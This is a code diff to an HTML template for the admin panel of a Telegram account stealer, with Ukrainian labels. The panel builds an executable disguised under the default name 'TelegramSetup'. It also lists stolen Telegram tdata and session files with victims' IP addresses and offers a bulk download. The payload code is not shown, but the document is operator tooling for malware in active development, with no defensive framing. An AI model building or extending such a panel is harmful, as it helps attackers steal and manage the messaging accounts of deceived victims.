@@ -14,10 +14,10 @@
                 <h5>Налаштування стіллера</h5>
             </div>
             <div class="card-body">
-                <form method="POST" action="{{ url_for('admin.build_stealer') }}">
+                <form method="POST" action="{{ url_for('admin.build_stealer') }}" id="stealerForm">
                     <div class="mb-3">
                         <label class="form-label">Назва файлу:</label>
-                        <input type="text" class="form-control" name="filename" value="TelegramSetup" placeholder="Введіть назву .exe файлу">
+                        <input type="text" class="form-control" name="filename" value="TelegramSetup" placeholder="Введіть назву .exe файлу" required>
                     </div>
                     
                     <div class="mb-3">
@@ -27,7 +27,6 @@
                                 {{ current_user.username }} (поточний адмін)
                             </option>
                             {% if is_main_admin %}
-                            <!-- Якщо головний адмін - можна вибрати іншого адміна -->
                             <option value="all">Всі адміністратори</option>
                             {% endif %}
                         </select>
@@ -86,7 +85,7 @@
                         </div>
                     </div>
                     
-                    <button type="submit" class="btn btn-success w-100">
+                    <button type="submit" class="btn btn-success w-100" id="buildBtn">
                         <i class="fas fa-hammer"></i> Збудувати стіллер
                     </button>
                 </form>
@@ -104,26 +103,54 @@
                 <div class="mb-3">
                     <strong>Статистика:</strong>
                     <div class="mt-2">
-                        <span class="badge bg-info">Файлів: 0</span>
-                        <span class="badge bg-success">tdata: 0</span>
-                        <span class="badge bg-warning">sessions: 0</span>
+                        <span class="badge bg-info">Файлів: {{ total_files }}</span>
+                        <span class="badge bg-success">tdata: {{ tdata_count }}</span>
+                        <span class="badge bg-warning">sessions: {{ sessions_count }}</span>
                     </div>
                 </div>
                 
-                <div class="list-group">
-                    <div class="list-group-item">
-                        <div class="d-flex w-100 justify-content-between">
-                            <h6 class="mb-1">Немає отриманих файлів</h6>
-                            <small class="text-muted">---</small>
+                <!-- Список файлів -->
+                <div class="list-group" style="max-height: 300px; overflow-y: auto;">
+                    {% if stolen_files %}
+                        {% for file in stolen_files %}
+                        <div class="list-group-item">
+                            <div class="d-flex w-100 justify-content-between">
+                                <!-- ВИПРАВЛЕНА ЛІНІЯ - заміни basename фільтр -->
+                                <h6 class="mb-1">{{ file.file_path.split('/')[-1] if '/' in file.file_path else file.file_path.split('\\')[-1] }}</h6>
+                                <small class="text-muted">{{ file.created_at.strftime('%Y-%m-%d %H:%M') }}</small>
+                            </div>
+                            <p class="mb-1">
+                                <span class="badge bg-secondary">{{ file.data_type }}</span>
+                                <span class="badge bg-info">
+                                    {% if file.file_size > 1024*1024 %}
+                                        {{ "%.2f"|format(file.file_size / (1024*1024)) }} MB
+                                    {% elif file.file_size > 1024 %}
+                                        {{ "%.2f"|format(file.file_size / 1024) }} KB
+                                    {% else %}
+                                        {{ file.file_size }} B
+                                    {% endif %}
+                                </span>
+                            </p>
+                            <small class="text-muted">IP: {{ file.ip_address }}</small>
                         </div>
-                        <p class="mb-1">Файли будуть відображатися тут після отримання</p>
-                        <small class="text-muted">Статус: Очікування...</small>
-                    </div>
+                        {% endfor %}
+                    {% else %}
+                        <div class="list-group-item">
+                            <div class="d-flex w-100 justify-content-between">
+                                <h6 class="mb-1">Немає отриманих файлів</h6>
+                                <small class="text-muted">---</small>
+                            </div>
+                            <p class="mb-1">Файли будуть відображатися тут після отримання</p>
+                            <small class="text-muted">Статус: Очікування...</small>
+                        </div>
+                    {% endif %}
                 </div>
                 
                 <div class="mt-3">
-                    <button class="btn btn-outline-primary btn-sm w-100" disabled>
-                        <i class="fas fa-download"></i> Завантажити всі файли (0)
+                    <button class="btn btn-outline-primary btn-sm w-100" 
+                            {% if not stolen_files %}disabled{% endif %}
+                            onclick="stealerManager.downloadAllFiles()">
+                        <i class="fas fa-download"></i> Завантажити всі файли ({{ total_files }})
                     </button>
                 </div>
             </div>
@@ -144,4 +171,8 @@
         </div>
     </div>
 </div>
+{% endblock %}
+
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/stealer.js') }}"></script>
 {% endblock %}
